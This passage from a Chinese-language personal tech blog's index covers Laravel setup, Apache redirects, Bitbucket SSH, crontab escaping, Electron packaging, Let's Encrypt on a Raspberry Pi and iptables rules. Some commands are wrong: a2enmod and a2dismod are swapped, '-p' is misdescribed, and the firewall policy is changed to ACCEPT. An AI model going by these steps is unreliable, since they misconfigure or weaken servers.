mysql環境變數\nEX:\n```\nDB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=33060\nDB_DATABASE=homestead\nDB_USERNAME=root\nDB_PASSWORD=root\n```\n\n請順便建立你命名DB名稱(DB_DATABASE)\n\n\n4.在laravel 執行下面指令\n`php artisan migrate`\n\n```\nSQLSTATE[42S02]: Base table or view not found: 1146 Table 'homestead.tasks' doesn't exist (SQL: select * from `tasks` order by `created_at` desc) search►\n```\n出現以上錯誤代表沒執行`php artisan migrate`\n\n\n參考來源\n[Releases · laravel-dojo/wagon](https://github.com/laravel-dojo/wagon/releases)\n[What step am I missing?](https://laracasts.com/discuss/channels/eloquent/what-step-am-i-missing?page=0)\n","tags":["Laravel"],"categories":["Laravel"]},{"title":"Apache 80 port 網址自動轉443 port方法","url":"%2Fblog%2F2017%2F11%2F09%2Flogdown%2F2017-11-09-3423821%2F","content":"上次動物機設定TSL有做過設定\n不過網路上發現有一個方法\n先記一下筆記\n\n<!--more-->\n```\nNameVirtualHost *:80\n<VirtualHost *:80>\n   ServerName www.example.com\n   Redirect / https://secure.example.com/\n</VirtualHost>\n\n<VirtualHost _default_:443>\n   ServerName secure.example.com\n   DocumentRoot /usr/local/apache2/htdocs\n   SSLEngine On\n# etc...\n</VirtualHost>\n```\n\n在80設定檔可以看到 `Redirect / https://secure.example.com/`可以導到80 port\n但好像不能像rewrite_mod方法導到一樣頁面\n在這邊筆記一下。\n\n=====\n\n另外一個，rewrite_mod之前有記錄過...\nRaspberry PI 自動設定Let’s Encrypt！ TLS(SSL 憑證)\n\n\n參考來源：\n[NameVirtualHost](https://wiki.apache.org/httpd/RedirectSSL)\n","tags":["rewrite_mod"],"categories":["Apache"]},{"title":"Raspberry PI  Git Webhook...","url":"%2Fblog%2F2017%2F11%2F06%2Flogdown%2F2017-11-06-3305711%2F","content":"要做blog移轉，筆記先存檔...\n不過這篇可能不用實作了\n\nhttp://thesociablegeek.com/node/github-continuous-deployment-to-a-raspberry-pi/\n[GitHub Continuous deployment to a Raspberry Pi | The Sociable Geek](http://thesociablegeek.com/node/github-continuous-deployment-to-a-raspberry-pi/)\n[Localtunnel - 分享 Localhost Web Server - 蟑螂窩](http://blog.roachking.net/blog/2013/05/01/localtunnel/)","categories":["Linux"]},{"title":"[BitBucket]做git pull一直問你輸入密碼","url":"%2Fblog%2F2017%2F11%2F06%2Flogdown%2F2017-11-06-3301727%2F","content":"前幾個月有個程式，因為需要多人做設定檔\n所以就使用bitbucket來管理\n在樹莓派一直遇到要打帳號、密碼\n其怪，私鑰那些我都要試過阿\n\n結果Google一下，發現這篇\n[Git on Bitbucket: Always asked for password, even after uploading my public SSH key - Stack Overflow](https://stackoverflow.com/questions/8600652/git-on-bitbucket-always-asked-for-password-even-after-uploading-my-public-ssh?noredirect=1&lq=1)\n預設是https情況下會問密碼\n在.git/config把網址改成ssh網址確實可運做了\n`ssh://git@bitbucket.org/userName/repoName.git`\n\n\n```\nAs explained here, if you clone with SSH url, you don't need to enter username / password each time you push / pull. Check above answer by @manojlds\n\nBut if you want to clone with HTTPS and want to avoid entering username / password each time, you can store credentials into cache with below command:\n\ngit config --global credential.helper 'cache --timeout 3600'\n\nwhere 3600 (seconds) means 1 hour, you may change it as per your requirement.\n```\n\n網路上有一個解法，`http://username:password@bitbucket.org/...`\n但感覺不安全....","tags":["BitBucket"],"categories":["Git"]},{"title":"Crontab指令打百分比需要跳脫符號","url":"%2Fblog%2F2017%2F11%2F05%2Flogdown%2F2017-11-05-3279650%2F","content":"最近發現我上次設定的crontab 指令沒有成功\n仔細看了一下\n```/var/log/syslog.log\nNov  1 01:00:01 raspberrypi /USR/SBIN/CRON[1361]: (debian-transmission) CMD (mkdir /mnt/extHDD/Download/Mikata/`date \"+)\n```\n<!--more-->\n\n grep CRON /var/log/syslog\n\n  cron log:/var/log/cron\n\n難道crontab不能打百分比，需要補個跳拖字元...\ngoogle一下，發現還真的有\nhttps://tlanyan.me/percent-sign-in-crontab/\n\n\n這次還忘記要怎麼切換權限，那個沒特別開一個文章\n不過好險有做筆記的習慣，真的文章一找就有。\n覺得下次記一下，怎麼切換別的帳號\n不然太久真的忘記了","tags":["Crontab"],"categories":["Linux"]},{"title":"Server Side Includes(SSI)記錄","url":"%2Fblog%2F2017%2F09%2F20%2Flogdown%2F2017-09-20-2511953%2F","content":"今天同事請較我，順便讓我看到他網站有類似用include方法載入別的頁面\n```html\n<!--#include virtual=\"../quote.txt\" -->\n```\n但這個我沒看過...\n搜尋一下是，Server Side Includes\n<!--more-->\n\n因為沒有看過\n覺得還滿奇特，記錄一下XD\n\n感覺就像include網頁，現在每個程式應該都有include功能才是\n可能靜態網頁就沒有了\n\n有看到有安全性的問題\n目前可能猜想跟XSS有關係吧\n\nhttps://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%86%85%E5%B5%8C\n","tags":["SSI"],"categories":["Apache"]},{"title":"electron 新手做Tray通知(以electron-chat-app-demo為例)","url":"%2Fblog%2F2017%2F09%2F19%2Flogdown%2F2017-09-19-2496270%2F","content":"要做blog移轉，筆記先存檔...\n\n<!--more-->\n\n\nElectron 中文文檔\nhttps://dl.lianst.com/ebook/Electron%20%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3.pdf\n\nhttp://zhuxindaba.github.io/2016/07/05/Electron/desktop_environment_integration/\n\n```javascript\nvar {Menu, Tray} = require('electron').remote\n```\n\n```javascript\nconst trayIcon = path.join(__dirname, 'icons/icon-16x16.png');\nconst tray = new Tray(trayIcon);\n```\nhttps://www.christianengvall.se/electron-packager-tutorial/\nhttps://github.com/electron/electron/issues/7657","categories":["electron"]},{"title":"electron 新手轉exe筆記","url":"%2Fblog%2F2017%2F09%2F15%2Flogdown%2F2017-09-15-2463354%2F","content":"要做blog移轉，筆記先存檔...\n<!--more-->\n\n\nhttps://github.com/pfan123/electron-docs\n\nLogdown\nhttps://logdown.com/account/posts/2463354/edit\nelectron-packager\nhttps://github.com/pfan123/electron-docs\nGetting Started for Electron\nhttps://help.syncfusion.com/js/electron\ndemian85/electron-chat-app-demo: Simple Electron Chat App Demo (evaluation task)\nhttps://github.com/demian85/electron-chat-app-demo\npfan123/electron-docs: electron-docs学习文档\nhttps://github.com/pfan123/electron-docs\nSquirrel.Windows/5-updating.md at master · Squirrel/Squirrel.Windows\nhttps://github.com/Squirrel/Squirrel.Windows/blob/master/docs/getting-started/5-updating.md\n\n\nchat package.json\n\n```\n  \"dependencies\": {\n    \"express\": \"4.14.0\",\n    \"marked\": \"^0.3.6\",\n    \"socket.io\": \"1.4.8\",\n    \"babel-cli\": \"^6.16.0\",\n    \"babel-preset-react\": \"^6.16.0\",\n    \"electron\": \"^1.4.2\",\n    \"eslint\": \"^3.7.0\",\n    \"eslint-config-airbnb\": \"^12.0.0\",\n    \"eslint-plugin-import\": \"^1.16.0\",\n    \"eslint-plugin-jsx-a11y\": \"^2.2.2\",\n    \"eslint-plugin-react\": \"^6.3.0\"\n  }\n  ```\n\n\n\n\n```\n1181 verbose unbuild rmStuff eslint-config-airbnb@12.0.0 from C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\n1182 verbose unbuild rmStuff in node_modules\n1183 info lifecycle eslint-config-airbnb@12.0.0~postuninstall: eslint-config-airbnb@12.0.0\n1184 silly unbuild eslint@3.19.0\n1185 info lifecycle eslint@3.19.0~preuninstall: eslint@3.19.0\n1186 info lifecycle eslint@3.19.0~uninstall: eslint@3.19.0\n1187 verbose unbuild rmStuff eslint@3.19.0 from C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\n1188 verbose unbuild rmStuff in node_modules\n1189 verbose unlock done using C:\\Users\\Administrator\\AppData\\Roaming\\npm-cache\\_locks\\staging-834cabcd517fd52e.lock for C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\\.staging\n1190 verbose stack Error: May not delete: C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\\.bin\n1190 verbose stack     at gentlyRm (C:\\Program Files\\nodejs\\node_modules\\npm\\lib\\utils\\gently-rm.js:49:15)\n1190 verbose stack     at gentlyRmBinRoot (C:\\Program Files\\nodejs\\node_modules\\npm\\lib\\unbuild.js:86:12)\n1190 verbose stack     at cb (C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\async-map.js:47:24)\n1190 verbose stack     at LOOP (C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\chain.js:7:26)\n1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\chain.js:18:7\n1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\lib\\utils\\gently-rm.js:70:40\n1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\slide\\lib\\chain.js:16:22\n1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\iferr\\index.js:11:16\n1190 verbose stack     at C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\graceful-fs\\polyfills.js:284:29\n1190 verbose stack     at FSReqWrap.oncomplete (fs.js:153:21)\n1191 verbose cwd C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\n1192 verbose Windows_NT 10.0.15063\n1193 verbose argv \"C:\\\\Program Files\\\\nodejs\\\\node.exe\" \"C:\\\\Program Files\\\\nodejs\\\\node_modules\\\\npm\\\\bin\\\\npm-cli.js\" \"prune\" \"--production\"\n1194 verbose node v8.5.0\n1195 verbose npm  v5.3.0\n1196 error May not delete: C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\electron-packager\\win32-x64\\electron-chat-app-demo-win32-x64\\resources\\app\\node_modules\\.bin\n1197 verbose exit [ 1, true ]\n```","categories":["electron"]},{"title":"Raspberry PI 自動設定Let’s Encrypt！ TLS(SSL 憑證)","url":"%2Fblog%2F2017%2F09%2F11%2Flogdown%2F2017-09-11-erection-of-https%2F","content":" 最近想讓動物機增加安全性，有看到免費的letsencrypt教學文\n 又好像有工具自動產生憑證\n 以經有看到勇者試了，當然也要嘗試:P\n\n\n<!--more-->\n\n\n本來想說應該會很順利吧\n結果沒有...\n\n[申請Let’s Encrypt－以Raspberry Pi為例 ](https://www.weblink.idv.tw/2017/74)，\n再做這篇的時候會跳出版本太舊\n\n`sudo ./certbot-auto --apache --domain=**網域** certonly`\n\n動物機好像說版本太舊\n\n```\n$ sudo apt-get remove libaugeas0 augeas-tools libaugeas-dev\n$ sudo apt-get install libreadline6-dev libxml2-dev\n$ cd /tmp\n$ wget http://download.augeas.net/augeas-1.6.0.tar.gz\n$ tar -zxf augeas-1.6.0.tar.gz\n$ cd augeas-1.6.0\n$ CFLAGS='-march=armv6 -mfpu=vfp -mfloat-abi=hard' CPPFLAGS='-march=armv6 -mfpu=vfp -mfloat-abi=hard' ./configure\n$ CFLAGS='-march=armv6 -mfpu=vfp -mfloat-abi=hard' CPPFLAGS='-march=armv6 -mfpu=vfp -mfloat-abi=hard' make\n$ sudo make install\n```\n[Let’s Encrypt for the Raspberry Pi (model B)](https://lordofthemoon.com/blog/2016/08/lets-encrypt-for-the-raspberry-pi-model-b/)\n後來找上面那個方法還是沒用\n最後~~賭~~升級`sudo apt-get dist-uprgrade`\n升上去就可以跑了...\n\n但會出現Timeout狀態\n(之後有找到原因我的AP的 Virtual Server沒有設定443PORT)\n不過我最後設完，apache設定沒有自動增加ssl設定\n\n看來有機會還是要開一個apache筆記\n\n\n\n最後看到另一篇用webroot方法，[免費的 SSL 憑證：Let’s Encrypt！](https://ezbox.idv.tw/52/free-ssl-lets-encrypt-certbot/)\n\n`sudo ./certbot-auto certonly --webroot -d ***網域***`\n\n ```\nSaving debug log to /var/log/letsencrypt/letsencrypt.log\nPlugins selected: Authenticator webroot, Installer None\nObtaining a new certificate\nPerforming the following challenges:\nhttp-01 challenge for ****\n\nSelect the webroot for ****\n-------------------------------------------------------------------------------\n1: Enter a new webroot\n-------------------------------------------------------------------------------\nPress 1 [enter] to confirm the selection (press 'c' to cancel):\n\n** Invalid input **\nPress 1 [enter] to confirm the selection (press 'c' to cancel): 1\nInput the webroot for ******: (Enter 'c' to cancel):\n\n-------------------------------------------------------------------------------\n does not exist or is not a directory\n-------------------------------------------------------------------------------\nInput the webroot for ********: (Enter 'c' to cancel): /var/www/\nWaiting for verification...\nCleaning up challenges\n\nIMPORTANT NOTES:\n - Congratulations! Your certificate and chain have been saved at:\n   /etc/letsencrypt/live/****/fullchain.pem\n   Your key file has been saved at:\n   /etc/letsencrypt/live/****/privkey.pem\n   Your cert will expire on 2017-12-10. To obtain a new or tweaked\n   version of this certificate in the future, simply run certbot-auto\n   again. To non-interactively renew *all* of your certificates, run\n   \"certbot-auto renew\"\n - If you like Certbot, please consider supporting our work by:\n\n   Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate\n   Donating to EFF:                    https://eff.org/donate-le\n```\n\n看到這個就表示成功\n>  申請的網域的SSL憑證\n>cert.pem: Your domain's certificate\n Let's Encrypt 的 鏈證書\n>chain.pem: The Let's Encrypt chain certificate\n cert.pem 和 chain.pem 的合併檔\n>fullchain.pem: cert.pem and chain.pem combined\n SSL憑證的私鑰，千千萬萬要飽護好\n>privkey.pem: Your certificate's private key\n\n```\n<VirtualHost *:443>\n        ServerAdmin service@**網域**\n        DocumentRoot /var/www/\n        ServerName **網域**\n        ServerAlias **網域**\n\n        SSLEngine On\n        SSLCertificateFile /etc/letsencrypt/live/**網域**/cert.pem\n        SSLCertificateKeyFile /etc/letsencrypt/live/**網域**/privkey.pem\n        SSLCertificateChainFile /etc/letsencrypt/live/**網域**/chain.pem\n        SSLCACertificateFile /etc/letsencrypt/live/**網域**/fullchain.pem\n</VirtualHost>\n```\n\n\n`Invalid command 'SSLEngine', perhaps misspelled or defined by a module not included in the server configuration`\n這個錯誤訊息是  沒有啟用ssl模組\n啟用\n`sudo a2dismod ssl`\n\n但後來發現怎麼很多沒有教關閉\n爬文一下就找到了\n\n關閉\n`sudo a2enmod ssl`\n\n\n\n因為先前發現不能連webroot可以產生\n但還是連不到443port\n後來發現是Virtual Server沒設\n設定完OK\n想說試試第一個方法跑一次\n結果跑出另一個憑證\n\n爬文找刪除\n直接刪資料夾是不能解決問題的XD\n\n# 回收憑證\n\n　　`certbot revoke --cert-path /etc/letsencrypt/live/example.com/cert.pem`\n\n　　`certbot delete --cert-name example.com`\n\n\n\n\nUbuntu 12.04啟用apache的 SSL\nhttp://kirby86a.pixnet.net/blog/post/95136568-ubuntu-12.04%E5%95%9F%E7%94%A8apache%E7%9A%84-ssl\n免費的 SSL 憑證：Let’s Encrypt！\nhttps://ezbox.idv.tw/52/free-ssl-lets-encrypt-certbot/\n\n\n番外apache mod rewrite功能\n\n`sudo a2enmod rewrite`\n\nor\n\n` sudo ln -s /etc/apache2/mods-available/rewrite.load /etc/apache2/mods-enabled/rewrite.load`\n\n在/etc/apache2/sites-enabled/000-default\n\n` AllowOverride None`\n\n```\nRewriteEngine on\nRewriteCond  %{HTTPS} !=on\n#RewriteRule  ^(.*) https://%{SERVER_NAME}$1 [L,R]\n RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R]\n\n```\n\n這樣http就能導到https了\n\n我有擋國外IP要怎麼自動更新憑證\n\n```ssl_renew.sh\niptables -F\n/usr/local/bin/certbot-auto renew --quiet\nsh /etc/network/iptables.sh\n```\n\n自動更新憑證\n`30 2 1 * * sh /root/ssl_bot.sh`\n\n\n**2017/10/17**\n發現網站憑證日期怎麼沒有更新...\n以為設定有問題\nGoogle查了一下\n>這是因為certbot-auto renew 會讀取 /etc/letsencrypt/renewal 下的設定\n檢查每個授權是否距離過期時間只剩30天，如果是才執行更新\n( 參考：https://tiicle.com/items/15/ubuntu-1404-using-the-let-s-configuration-is-security-to-encrypt-nginx-https-server )\n\n待下個月再檢查\n\n參考來源: https://www.tipga.com/e/597853093286fe2b8f7a56e5\n\n\n\n\n\n---\n在RT1900AC上使用Let's Encrypt的SSL憑證-半殘版\nhttps://darkdragon-darkdragon.blogspot.com/2017/05/rt1900aclets-encryptssl.html\nNGINX 使用 Let’s Encrypt 免費 SSL 憑證設定 HTTPS 安全加密網頁教學\nhttps://blog.gtwang.org/linux/secure-nginx-with-lets-encrypt-ssl-certificate-on-ubuntu-and-debian/\n\n啟動 Ubuntu 下的 Apache mod rewrite 與相關設定\nhttp://asika.windspeaker.co/post/3471-start-with-ubuntu-apache-the-mod-the-rewrite-set\n\n\n\n\n","tags":["Certbot"],"categories":["Linux"]},{"title":"修改iptables設定筆記","url":"%2Fblog%2F2017%2F09%2F10%2Flogdown%2F2017-09-10-2375763%2F","content":"最近想在動物機加上https協定\n所以必須在iptables加上443 的port\n但是...iptables早就忘了\n\n<!--more-->\n\n\n原本設定\n```\niptables -F\niptables -P INPUT DROP\niptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\niptables -A INPUT -s 192.168.1.0/24 -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n\n\n\n#taiwan ip input http:80\niptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 218.160.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.62.248.0/21 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.20.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.72.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.72.0.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.242.0.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.71.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.75.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 202.39.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 103.25.236.0/22 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 1.160.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.32.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 122.120.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 60.249.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 60.250.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 59.124.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.128.0.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.30.32.0/20 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.217.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.228.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.22.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.21.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.75.0.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.242.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.61.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.74.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.66.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 43.255.92.0/22 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 1.34.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.24.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 118.160.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 122.116.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 125.224.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 60.248.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 175.111.192.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.218.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.220.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.23.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 59.112.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.75.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.241.224.0/19 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.59.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.65.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.69.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 36.224.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 111.240.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 118.168.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 122.118.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 125.232.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 168.95.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 59.120.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 218.168.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.224.0.0/14 -p tcp --dport 80 -j ACCEPT\n#dai taipei 61.70.239.206\niptables -A INPUT -s 115.43.78.0/24 -p tcp --dport 80 -j ACCEPT\n\n\n#3 ip-prefix split\niptables -A INPUT -s 202.39.0.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 202.39.64.0/19 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.129.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.137.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.141.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.143.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.128.64.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.128.192.0/18 -p tcp --dport 80 -j ACCEPT\n\n\n#emonme ip-prefix\niptables -A INPUT -s 211.79.32.0/20 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 221.120.0.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 221.120.64.0/19 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 116.59.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.136.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 111.70.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 111.80.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 223.136.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 42.64.0.0/12 -p tcp --dport 80 -j ACCEPT\n\n\n#ALL INTO 80 port\n#iptables -A INPUT -p tcp --dport 80 -j ACCEPT\n\n#tranmission\niptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 9091  -j ACCEPT\niptables -A INPUT -p tcp --dport 59999:61000 -j ACCEPT\n```\n\n最近在COSCUP 2017聽到iptables設定\n\n```\niptables -P INPUT ACCEPT\niptables -P OUTPUT ACCEPT\niptables -P FORWARD ACCEPT\n....\niptables -A INPUT -j DROP\n```\n\n所以要改一下，還要開放443 port\n`iptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT`\n-A 是增加iptable條件。如果iptable已經有4個。打下一個指令會變成有5個\n\n-s 來源\n-p port\n`iptables -A INPUT -s 0/0 -p tcp --dport 443 -j ACCEPT`\n\n修改後\n```\niptables -F\niptables -P INPUT ACCEPT\niptables -P OUTPUT ACCEPT\niptables -P FORWARD ACCEPT\niptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\niptables -A INPUT -s 192.168.1.0/24 -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n\n\n\n#taiwan ip input http:80\niptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 218.160.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.62.248.0/21 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.20.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.72.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.72.0.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.242.0.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.71.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.75.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 202.39.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 103.25.236.0/22 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 1.160.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.32.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 122.120.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 60.249.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 60.250.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 59.124.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.128.0.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.30.32.0/20 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.217.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.228.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.22.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.21.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.75.0.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.242.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.61.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.74.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.66.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 43.255.92.0/22 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 1.34.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 114.24.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 118.160.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 122.116.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 125.224.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 60.248.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 175.111.192.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.218.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.220.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.23.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 59.112.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 211.75.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.241.224.0/19 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.59.128.0/17 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 210.65.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 203.69.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 36.224.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 111.240.0.0/12 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 118.168.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 122.118.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 125.232.0.0/15 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 168.95.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 59.120.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 218.168.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 61.224.0.0/14 -p tcp --dport 80 -j ACCEPT\n#dai taipei 61.70.239.206\niptables -A INPUT -s 115.43.78.0/24 -p tcp --dport 80 -j ACCEPT\n\n\n#3 ip-prefix split\niptables -A INPUT -s 202.39.0.0/18 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 202.39.64.0/19 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.129.0.0/13 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 220.137.0.0/14 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -s 